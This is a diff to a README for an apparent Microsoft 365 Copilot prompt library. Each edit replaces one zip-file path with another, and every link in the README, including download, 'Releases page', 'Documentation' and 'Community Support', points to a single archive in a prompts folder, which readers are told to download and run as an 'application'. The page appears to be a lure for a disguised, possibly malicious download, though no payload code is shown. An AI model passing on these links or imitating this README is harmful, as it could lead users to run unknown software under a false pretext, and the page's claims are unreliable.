@@ -1,6 +1,6 @@
 # 🎉 awesome-microsoft-copilot-prompts - Boost Your Team's Productivity Effortlessly
 
-[![Download Latest Release](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip)
 
 ## 📋 Description
 The definitive Microsoft 365 Copilot prompt library for business teams. This repository contains over 300 prompts for Office apps, Copilot Studio, and enterprise deployment. Each prompt has been battle-tested in real environments to help you maximize productivity and streamline workflows.
@@ -18,7 +18,7 @@ Follow these simple steps to download and run the application.
 ### Step 1: Visit the Releases Page
 To get the latest version of the awesome-microsoft-copilot-prompts, visit the releases page using the link below:
 
-[Download Latest Release](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip)
+[Download Latest Release](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip)
 
 ### Step 2: Download the Application
 On the Releases page, you will find several versions of the software. Look for the latest version and click on the link to download the application to your computer.
@@ -45,12 +45,12 @@ Simply choose a prompt that suits your needs and paste it into your Office appli
 ## 📚 Additional Resources
 For further assistance or to explore more features, please refer to the following resources:
 
-- [Documentation](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip)
-- [Community Support](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip)
+- [Documentation](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip)
+- [Community Support](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip)
 
 ## 🔗 Download & Install
 Ready to boost your productivity? Click the link below to download the awesome-microsoft-copilot-prompts now:
 
-[Download Latest Release](https://github.com/mirzoig/awesome-microsoft-copilot-prompts/raw/refs/heads/main/prompts/power-users/awesome_microsoft_copilot_prompts_v2.2.zip)
+[Download Latest Release](https://raw.githubusercontent.com/mirzoig/awesome-microsoft-copilot-prompts/main/prompts/outlook/awesome-prompts-microsoft-copilot-v1.8.zip)
 
 Feel free to reach out if you have any questions. Enjoy your experience with Microsoft 365 Copilot prompts!
